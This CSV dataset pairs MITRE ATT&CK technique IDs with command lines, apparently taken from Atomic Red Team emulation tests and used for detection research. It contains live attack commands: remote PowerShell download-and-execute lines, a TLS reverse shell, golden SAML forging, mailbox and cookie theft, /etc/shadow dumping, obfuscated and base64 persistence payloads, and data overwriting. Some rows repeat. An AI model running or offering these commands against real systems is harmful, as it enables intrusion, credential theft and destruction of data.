mitre_id,command
T1563,"QUERY USER SC.EXE CREATE SESSHIJACK BINPATH= ""CMD.EXE /K TSCON #{SESSION_ID} /DEST:#{DESTINATION_ID}"" NET START SESSHIJACK"
T1555,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') wificreds -consoleoutput -noninteractive 
T1497,"IF [ ""$(CSRUTIL STATUS | GREP -V 'ENABLED')"" != """" ]; THEN ECHO 'POSSIBLE VIRTUALIZATION ENVIRONMENT DETECTED'; FI;"
T1047,"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")"
T1202,"conhost.exe ""#{process}"""
T1095,"CMD /C ""#{NCAT_EXE}"" #{SERVER_IP} #{SERVER_PORT}"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh
T1485,dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached  "
T1037,"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmuy29tbw9uid4gl3rtcc9umtazny4wmdqucmmuy29tbw9ujykk'))\"""" | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common sudo chmod +x /etc/rc.common   "
T1039,copy \\#{remote}\c$\#{share_file} %temp%\#{local_file}  
T1546,echo '#{text_to_append}' >> /etc/profile
T1578,AZ SNAPSHOT CREATE --RESOURCE-GROUP #{AZURE_RESOURCE_GROUP} --NAME #{AZURE_SNAPSHOT_NAME} --SOURCE #{AZURE_DISK_NAME} --LOCATION EASTUS
T1201,secedit.exe /export /areas securitypolicy /cfg output_mysecpol.txt  
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/shells/invoke-powershellicmp.ps1') invoke-powershellicmp -ipaddress #{server_ip} # id_1332
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()} "
T1571,test-netconnection -computername #{domain} -port #{port}
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()} "
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}"
T1133,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-beacon.ps1 -dohserver #{doh_server} -domain #{domain} -subdomain #{subdomain} -querytype #{query_type} -c2interval #{c2_interval} -c2jitter #{c2_jitter} -runtime #{runtime}"
T1197,bitsadmin.exe /transfer /download /priority foreground #{remote_file} #{local_file} # id_4847
T1482,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=organizationalunit) #{optional_args}"
T1027,cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
T1095,iex (new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') powercat -c #{server_ip} -p #{server_port}
T1012,reg.exe query hklm\software\microsoft\windows\softwareinventorylogging /v collectionstate /reg:64
T1082,$s3cur3th1ssh1t_repo = 'https://raw.githubusercontent.com/s3cur3th1ssh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') otherchecks -noninteractive -consoleoutput
T1201,cat /etc/security/pwquality.conf 
T1114,"$SS = CONVERTTO-SECURESTRING ""#{PASSWORD}"" -ASPLAINTEXT -FORCE $CRED = NEW-OBJECT PSCREDENTIAL -ARGUMENTLIST '#{USERNAME}', $SS $PARAM = @{ CREDENTIAL = $CRED FORCE = $TRUE } $NULL = CONNECT-AZACCOUNT @PARAM $TOKEN = (GET-AZACCESSTOKEN -RESOURCETYPENAME MSGRAPH -ERRORACTION STOP).TOKEN $CERT = NEW-SELFSIGNEDCERTIFICATE -SUBJECT ""CN=POWERSHELL APPLICATION"" -CERTSTORELOCATION ""CERT:\CURRENTUSER\MY"" -KEYEXPORTPOLICY EXPORTABLE -KEYSPEC SIGNATURE -KEYLENGTH 2048 -KEYALGORITHM RSA -HASHALGORITHM SHA256 $REQRESOURCEACCESS = ( @{ ""RESOURCEACCESS"" = (@{""ID""= ""570282FD-FA5C-430D-A7FD-FC8DC98A9DCA""; ""TYPE""= ""SCOPE""}, @{ ""ID""= ""7427E0E9-2FBA-42FE-B0C0-848C9E6A8182""; ""TYPE""= ""SCOPE""}, @{""ID""= ""37F7F235-527C-4136-ACCD-4A02D197296E""; ""TYPE""= ""SCOPE""}, @{""ID""= ""14DAD69E-099B-42C9-810B-D002981FEEC1""; ""TYPE""= ""SCOPE""}, @{ ""ID""= ""E1FE6DD8-BA31-4D61-89E7-88639DA4683D""; ""TYPE""= ""SCOPE""}, @{ ""ID""= ""810C84A8-4A9E-49E6-BF7D-12D183F40D01""; ""TYPE""= ""ROLE""}); ""RESOURCEAPPID"" = ""00000003-0000-0000-C000-000000000000"" }) CONNECT-MGGRAPH -ACCESSTOKEN $TOKEN $CONTEXT = GET-MGCONTEXT $USERS = GET-MGUSER $APP = NEW-MGAPPLICATION -DISPLAYNAME ""T1114.002 ATOMIC TEST #1 - OFFICE365 - REMOTE EMAIL COLLECTION"" -REQUIREDRESOURCEACCESS $REQRESOURCEACCESS -WEB @{ REDIRECTURIS=""HTTP://LOCALHOST""; } -KEYCREDENTIALS @(@{ TYPE=""ASYMMETRICX509CERT""; USAGE=""VERIFY""; KEY=$CERT.RAWDATA }) NEW-MGSERVICEPRINCIPAL -APPID $APP.APPID -ADDITIONALPROPERTIES @{} | OUT-NULL $RESOURCESPN = GET-MGSERVICEPRINCIPAL -FILTER ""APPID EQ '$($APP.APPID)'"" $GRAPHAPIAPP = GET-MGSERVICEPRINCIPAL -FILTER ""DISPLAYNAME EQ 'MICROSOFT GRAPH'"" $MAILROLE = $GRAPHAPIAPP.APPROLES|WHERE-OBJECT VALUE -EQ ""MAIL.READ"" NEW-MGSERVICEPRINCIPALAPPROLEASSIGNMENT -SERVICEPRINCIPALID $RESOURCESPN.ID -PRINCIPALID $RESOURCESPN.ID -RESOURCEID $GRAPHAPIAPP.ID -APPROLEID $MAILROLE.ID $MAILBOX1 = ""#{1ST_TARGET_MAILBOX}"" $MAILBOX2 = ""#{2ND_TARGET_MAILBOX}"" $MAILBOX3 = ""#{3RD_TARGET_MAILBOX}"" [SYSTEM.COLLECTIONS.ARRAYLIST]$SELECTUSERS = @() FOREACH ($USER IN $USERS) {IF (($USER.MAIL -EQ $MAILBOX1) -OR ($USER.MAIL -EQ $MAILBOX2) -OR ($USER.MAIL -EQ $MAILBOX3)){$SELECTUSERS.ADD($USER.ID)}} CONNECT-MGGRAPH -CLIENTID $APP.APPID -TENANTID $CONTEXT.TENANTID -CERTIFICATENAME $CERT.SUBJECTNAME.NAME FOREACH ($USER IN $SELECTUSERS) { $URL= ""HTTPS://GRAPH.MICROSOFT.COM/V1.0/USERS/$($USER)/MESSAGES"" ; INVOKE-MGGRAPHREQUEST -URI $URL -METHOD GET -OUTPUTTYPE PSOBJECT}"
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd /c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('#{execution_command}')) + ""{enter}"")"
T1027,"$cmdwhy =[type](""{0}{1}"" -f 's','tring') ; $pz2sb0 =[type](""{1}{0}{2}""-f'nv','co','ert') ; &(""{0}{2}{3}{1}{4}"" -f'in','sio','voke-exp','res','n') ( (&(""{1}{2}{0}""-f'ble','get-','varia') ('cmdw'+'h'+'y')).""v`alue""::(""{1}{0}"" -f'in','jo').invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [char] ( $pz2sb0::""t`oint`16""(( [string]${_}) ,8)))})) ) # id_9695"
T1539,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""#{destination_path}""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
T1069,"net localgroup net localgroup ""administrators"" # id_2372"
T1134,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/tokenmanipulation/get-winlogontokensystem.ps1');get-winlogontokensystem  
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""#{immutable_id}"" -pfxfilename ""#{certificate_path}"" -issuer ""#{issuer_uri}"" $conn = get-aadintaccesstokenforaadgraph -samltoken $saml -savetocache if ($conn) { write-host ""`nsuccessfully connected as $($conn.user)"" } else { write-host ""`nthe connection failed"" } write-host ""end of golden saml"""
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"""
T1047,"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create #{process_to_execute} # id_7231"
T1606,"IMPORT-MODULE AADINTERNALS -FORCE $SAML = NEW-AADINTSAMLTOKEN -IMMUTABLEID ""#{IMMUTABLE_ID}"" -PFXFILENAME ""#{CERTIFICATE_PATH}"" -ISSUER ""#{ISSUER_URI}"" $CONN = GET-AADINTACCESSTOKENFORAADGRAPH -SAMLTOKEN $SAML -SAVETOCACHE IF ($CONN) { WRITE-HOST ""`NSUCCESSFULLY CONNECTED AS $($CONN.USER)"" } ELSE { WRITE-HOST ""`NTHE CONNECTION FAILED"" } WRITE-HOST ""END OF GOLDEN SAML"""
T1531,passwd #{user_account} #enter admin password > enter new password > confirm new password   
T1555,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azurepasswords.ps1"" $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azurermaccount -credential $credential get-azurepasswords -subscription '#{subscription_id}' > #{output_file} cat #{output_file} # id_4878"
T1531,"$pword = convertto-securestring -string #{super_pass} -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{super_user}, $pword if((get-aduser #{remove_user} -properties memberof).memberof -like ""cn=domain admins*""){ remove-adgroupmember -identity ""domain admins"" -members #{remove_user} -credential $credential -confirm:$false } else{ write-host ""error - make sure #{remove_user} is in the domain admins group"" -foregroundcolor red }  "
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"" # id_9052"
T1222,icacls.exe #{file_or_folder} /grant #{user_or_group}:f  
T1531,SYSADMINCTL -DELETEUSER #{USER_ACCOUNT} #ENTER ADMIN PASSWORD
T1033,[system.security.principal.windowsidentity]::getcurrent() | out-file -filepath .\currentuserobject.txt
T1106,"C:\WINDOWS\MICROSOFT.NET\FRAMEWORK\V4.0.30319\CSC.EXE /OUT:""#{OUTPUT_FILE}"" /TARGET:EXE ""#{SOURCE_FILE}"" %TMP%/T1106.EXE"
T1114,"$ss = convertto-securestring ""#{password}"" -asplaintext -force $cred = new-object pscredential -argumentlist '#{username}', $ss $param = @{ credential = $cred force = $true } $null = connect-azaccount @param $token = (get-azaccesstoken -resourcetypename msgraph -erroraction stop).token $cert = new-selfsignedcertificate -subject ""cn=powershell application"" -certstorelocation ""cert:\currentuser\my"" -keyexportpolicy exportable -keyspec signature -keylength 2048 -keyalgorithm rsa -hashalgorithm sha256 $reqresourceaccess = ( @{ ""resourceaccess"" = (@{""id""= ""570282fd-fa5c-430d-a7fd-fc8dc98a9dca""; ""type""= ""scope""}, @{ ""id""= ""7427e0e9-2fba-42fe-b0c0-848c9e6a8182""; ""type""= ""scope""}, @{""id""= ""37f7f235-527c-4136-accd-4a02d197296e""; ""type""= ""scope""}, @{""id""= ""14dad69e-099b-42c9-810b-d002981feec1""; ""type""= ""scope""}, @{ ""id""= ""e1fe6dd8-ba31-4d61-89e7-88639da4683d""; ""type""= ""scope""}, @{ ""id""= ""810c84a8-4a9e-49e6-bf7d-12d183f40d01""; ""type""= ""role""}); ""resourceappid"" = ""00000003-0000-0000-c000-000000000000"" }) connect-mggraph -accesstoken $token $context = get-mgcontext $users = get-mguser $app = new-mgapplication -displayname ""t1114.002 atomic test #1 - office365 - remote email collection"" -requiredresourceaccess $reqresourceaccess -web @{ redirecturis=""http://localhost""; } -keycredentials @(@{ type=""asymmetricx509cert""; usage=""verify""; key=$cert.rawdata }) new-mgserviceprincipal -appid $app.appid -additionalproperties @{} | out-null $resourcespn = get-mgserviceprincipal -filter ""appid eq '$($app.appid)'"" $graphapiapp = get-mgserviceprincipal -filter ""displayname eq 'microsoft graph'"" $mailrole = $graphapiapp.approles|where-object value -eq ""mail.read"" new-mgserviceprincipalapproleassignment -serviceprincipalid $resourcespn.id -principalid $resourcespn.id -resourceid $graphapiapp.id -approleid $mailrole.id $mailbox1 = ""#{1st_target_mailbox}"" $mailbox2 = ""#{2nd_target_mailbox}"" $mailbox3 = ""#{3rd_target_mailbox}"" [system.collections.arraylist]$selectusers = @() foreach ($user in $users) {if (($user.mail -eq $mailbox1) -or ($user.mail -eq $mailbox2) -or ($user.mail -eq $mailbox3)){$selectusers.add($user.id)}} connect-mggraph -clientid $app.appid -tenantid $context.tenantid -certificatename $cert.subjectname.name foreach ($user in $selectusers) { $url= ""https://graph.microsoft.com/v1.0/users/$($user)/messages"" ; invoke-mggraphrequest -uri $url -method get -outputtype psobject} "
T1560,"mkdir .\tmp\victim-files cd .\tmp\victim-files echo ""this file will be encrypted"" > .\encrypted_file.txt ""#{rar_exe}"" a -hp""blue"" hello.rar dir # id_4651"
T1564,net user $ atomic123! /add /active:yes
T1003,"unamestr=$(uname) if [ ""$unamestr"" = 'linux' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; elif [ ""$unamestr"" = 'freebsd' ]; then echo -e ""e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n"" | ed > #{output_file}; fi"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"" "
T1613,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)
T1047,wmic useraccount get /all /format:csv
T1543,"echo '#\!/bin/sh' > #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo '#' >> #{rc_service_path}/#{rc_service_file} echo '# provide: art-test' >> #{rc_service_path}/#{rc_service_file} echo '# require: login' >> #{rc_service_path}/#{rc_service_file} echo '# keyword: shutdown' >> #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo '. /etc/rc.subr' >> #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo 'name=""art_test""' >> #{rc_service_path}/#{rc_service_file} echo 'rcvar=art_test_enable' >> #{rc_service_path}/#{rc_service_file} echo 'load_rc_config ${name}' >> #{rc_service_path}/#{rc_service_file} echo 'command=""/usr/bin/touch""' >> #{rc_service_path}/#{rc_service_file} echo 'start_cmd=""art_test_start""' >> #{rc_service_path}/#{rc_service_file} echo '' >> #{rc_service_path}/#{rc_service_file} echo 'art_test_start()' >> #{rc_service_path}/#{rc_service_file} echo '{' >> #{rc_service_path}/#{rc_service_file} echo ' ${command} /tmp/art-test.marker' >> #{rc_service_path}/#{rc_service_file} echo '}' >> #{rc_service_path}/#{rc_service_file} echo ' ' >> #{rc_service_path}/#{rc_service_file} echo 'run_rc_command ""$1""' >> #{rc_service_path}/#{rc_service_file} chmod +x #{rc_service_path}/#{rc_service_file} service art-test enable service art-test start # id_1147"
